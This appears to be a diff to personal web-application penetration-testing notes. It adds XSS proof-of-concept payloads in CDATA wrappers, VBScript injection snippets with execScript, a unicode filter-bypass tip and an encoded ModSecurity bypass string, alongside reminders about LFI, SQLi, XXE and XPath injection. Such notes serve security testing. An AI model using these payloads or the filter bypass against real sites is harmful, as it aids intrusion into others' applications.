@@ -10,6 +10,8 @@ xxd for hex encoding
 
 check for LFI/RFI
 
+use UNICODE to bypass filtering
+
 sqli
 
 check strength of key: how big is search space? 
@@ -42,6 +44,21 @@ wsfuzzer: owasp project for testing SOAP
 
 use XML entity to ref external data (similar idea to LFI/RFI)
 
+XML, SGML: use CDATA
+
+<![CDATA[<img src="broken" onerror="alert('XSS')">]]>
+
+<![CDATA[><img src="broken" onerror="alert('XSS')">]]>
+
+vbscript:
+<script type="text/vbscript>
+if name="foo" then
+document.write("foo")
+end if
+</script>
+
+<img src='pic.gif' onload='vbs:MsgBox "foo"'>
+
 check for XPATH injection
 special char: /, *, @
 
@@ -53,17 +70,15 @@ does not use same origin policy (SOP)
 HTTP/2: rfc7540
 tools: mitmproxy, nghttp, python hyper, http2fuzz
 
+combine jscript, vbscript:
 
+<script type="text/vbscript">
+code = "alert(1)"
+execScript code
+</script>
 
-
-
-
-
-
-
-
-
-
+ModSecurity bypass:
+%23%2f%2a%0a
 
 
 
